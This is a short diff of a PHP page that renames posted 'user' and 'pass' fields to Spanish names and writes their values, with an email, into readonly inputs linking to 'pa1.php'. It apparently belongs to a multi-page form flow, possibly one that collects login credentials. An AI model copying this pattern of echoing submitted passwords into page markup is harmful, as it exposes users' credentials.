@@ -62,12 +62,12 @@ user-select: none;
           <img class="bottomform" src="img/botton.png" alt="botton">
           
            <?php 
-                     $variable= $_POST['user'];
-        echo '<a href="pa1.php"></a><input id="user" name="user" value="'. htmlspecialchars($variable) . '" readonly />'."\n";
+                     $variable= $_POST['usuario'];
+        echo '<a href="pa1.php"></a><input id="usuario" name="usuario" value="'. htmlspecialchars($variable) . '" readonly />'."\n";
 		?>
            <?php 
-                     $variable= $_POST['pass'];
-        echo '<a href="pa1.php"></a><input id="pass" name="pass" value="'. htmlspecialchars($variable) . '" readonly />'."\n";
+                     $variable= $_POST['contra'];
+        echo '<a href="pa1.php"></a><input id="contra" name="contra" value="'. htmlspecialchars($variable) . '" readonly />'."\n";
 		?>
           <?php 
                      $variable= $_POST['email'];
